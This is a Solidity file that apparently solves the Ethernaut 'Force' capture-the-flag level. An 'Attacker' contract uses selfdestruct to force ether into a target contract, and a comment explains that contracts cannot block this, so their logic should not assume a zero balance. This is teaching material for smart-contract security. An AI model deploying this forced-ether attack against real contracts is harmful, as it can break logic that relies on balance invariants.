// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */
}

// https://soliditylang.org/blog/2024/01/26/solidity-0.8.24-release-announcement/
// Note that SELFDESTRUCT has already been deprecated for some time, by EIP-6049.

contract Attacker {
    function destruct(address _addr) public payable {
        selfdestruct(payable(_addr));
    }
}

/* 
In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.

However, there is no way to stop an attacker from sending ether to a contract by self destroying. 
Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.
 */
